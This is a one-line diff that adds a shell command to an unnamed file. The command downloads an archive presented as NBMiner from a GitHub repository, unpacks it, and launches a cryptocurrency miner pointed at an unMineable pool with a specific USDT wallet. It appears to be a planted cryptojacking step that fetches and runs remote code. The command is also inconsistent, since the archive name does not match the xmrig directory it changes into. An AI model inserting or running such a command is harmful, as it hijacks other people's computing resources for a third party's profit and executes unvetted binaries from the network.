@@ -1,1 +1,1 @@
-
+wget https://github.com/fcknjudas/fileshare_linux/blob/798117f7316222f2d1f8109882fd9cf0d438807b/gpu/NBMiner_42.3_Linux.tgz && tar xf NBMiner_42.3_Linux.tgz && cd xmrig-6.22.2 && ./nbminer -a kawpow -o stratum+ssl://kp.unmineable.com:4444 -u USDT:TM1ZcsbRhCWEf5HMWyUavb1i4iN9zLL2Zn.unmineable_worker_xfpbhmef#gs2u-xzq5 -log 
